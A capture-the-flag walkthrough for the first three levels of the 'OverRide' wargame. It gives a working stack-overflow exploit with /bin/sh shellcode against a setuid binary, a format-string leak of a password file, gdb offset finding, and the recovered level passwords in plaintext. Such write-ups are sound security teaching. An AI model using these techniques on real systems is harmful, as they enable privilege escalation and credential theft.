#LEVEL00:
1. Create and Launch VM

Choose OverRide.iso file and configure parameters, in Network->Port Forwarding: put HOST Port: 7777, Guest Port: 4242
OverRide login: level00
Password: level00
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level00/level00

2. In the host machine:
ssh level00@127.0.0.1 -p 7777

level00@127.0.0.1's password: level00

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level00/level00

3. level00@OverRide:~$ ls -la
total 13
dr-xr-x---+ 1 level01 level01   60 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level01 level01  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level00 level00 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level01 users   7280 Sep 10  2016 level00
-rw-r--r--  1 level01 level01  675 Sep 10  2016 .profile

4. level00@OverRide:~$ ./level00
***********************************
* 	     -Level00 -		  *
***********************************
5. scp -P 7777 level00@127.0.0.1:/home/users/level00/level00 ./Lien-Override/level00/source/level00

6. Decompiler Explorer: Go to this link and attach file of level00 to get the password of 5276
https://dogbolt.org/?id=d2ff384a-ea37-4370-9ae5-4814118e5725

7. Password:5276
Authenticated!
8. cat /home/users/level01/.pass                                       
uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

#LEVEL01
1. Copy level01 settings file host machine
scp -P 7777 level01@127.0.0.1:/home/users/level01/level01 ./Lien-Override/level01/source/level01

2. Find OFFSET: 
ssh level01@127.0.0.1 -p 7777

python -c 'print "dat_wil\n" + "A"*80 + "BBBB"' > /tmp/test01

gdb ./level01

run < /tmp/test01
info registers

eip            0x42424242
->OFFSET=80

3. ssh level01@127.0.0.1 -p 7777
cd /home/users/level01

cat > /tmp/level01.py << 'EOF'
import struct
import sys

A_USER_NAME = 0x0804a040
RET_ADDR = A_USER_NAME + 20
OFFSET = 80

shellcode = (
    "\x31\xc0\xb0\x31\xcd\x80"      # geteuid()
    "\x89\xc3\x89\xc1"              # ebx = eax, ecx = eax
    "\x31\xc0\xb0\x46\xcd\x80"      # setreuid(euid, euid)
    "\x31\xc0\x50"                  # push NULL
    "\x68\x2f\x2f\x73\x68"          # push "//sh"
    "\x68\x2f\x62\x69\x6e"          # push "/bin"
    "\x89\xe3\x50\x53\x89\xe1"      # ebx="/bin//sh", argv
    "\x99\xb0\x0b\xcd\x80"          # execve("/bin/sh", argv, NULL)
)

username = "dat_wil" + "\x90" * 100 + shellcode
password = "A" * OFFSET + struct.pack("<I", RET_ADDR)

payload = username + "\n" + password + "\n"

sys.stdout.write(payload)
EOF

4. (python /tmp/level01.py; echo "id"; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01
OR ((python /tmp/level01.py; cat) | ./level01
id
whoami
cat /home/users/level02/.pass)

OR
5. python3 level01.py
scp -P 7777 payload_level01 level01@127.0.0.1:/tmp/payload_level01

6. Password of level02: cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

#LEVEL02

The important part is here:

FILE* fp = fopen("/home/users/level03/.pass", "r");
fread(&buf_1, 1, 0x29, fp);

if (!strncmp(&buf_1, &buf, 0x29))
{
    printf("Greetings, %s!\n", &var_78);
    system("/bin/sh");
}

printf(&var_78);

What this means

The program:

-opens `/home/users/level03/.pass`;
-reads the password into `buf_1`;
-asks for username;
-asks for password;
-if the password is wrong, it does:

printf(&var_78);

Summary for `level02`

The vulnerability is:
printf(&var_78);

It should have been:
printf("%s", &var_78);

Exploit logic:

Use username as format string
→ leak stack values with %lx
→ find the chunks containing /home/users/level03/.pass
→ reverse each 8-byte chunk because little-endian
→ reconstruct level03 password
→ su level03

1. Copy level02 settings file host machine
scp -P 7777 level02@127.0.0.1:/home/users/level02/level02 ./Lien-Override/level02/source/level02

2. First leak stack values

(python -c 'print "%p " * 40; print "A"') | ./level02

Explanation:
first line  = username = "%p %p %p ..."
second line = password = "A"

The password is intentionally wrong, so the program reaches:
printf(username);

You should get many values like:
0x7fffffffe500 0x0 0x64 0x2a2a2a2a ...

Among them, look for values that look like ASCII when decoded, for example values beginning with:
0x48
0x50
0x41
0x6e
0x75

3. Cleaner leak with indexed positions

Use positional format specifiers:

(python -c 'print " ".join(["%%%d$lx" % i for i in range(1, 45)]); print "A"') | ./level02

This prints:
%1$lx %2$lx %3$lx ... %44$lx

For this level, the useful values are often around:

%22$lx
%23$lx
%24$lx
%25$lx
%26$lx

So test directly:
(python -c 'print "%22$lx %23$lx %24$lx %25$lx %26$lx"; print "A"') | ./level02

4. Why the output looks reversed

The binary is 64-bit little-endian.

So if the stack leaks:
756e505234376848

the real text is obtained by reversing the bytes:
75 6e 50 52 34 37 68 48

becomes:
48 68 37 34 52 50 6e 75

which is:
Hh74RPnu

5. Decode leaked chunks

Suppose you get chunks like this:
756e505234376848
45414a3561733951
377a7143574e6758
354a35686e475873
48336750664b394d

Decode them with Python 2 in the VM:
python - << 'EOF'
chunks = [
    "756e505234376848",
    "45414a3561733951",
    "377a7143574e6758",
    "354a35686e475873",
    "48336750664b394d",
]

password = ""
for c in chunks:
    password += c.decode("hex")[::-1]

print password
EOF

That will print the reconstructed password:
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

6. Then login to level03
Once we have the password:
su level03
Paste the password.




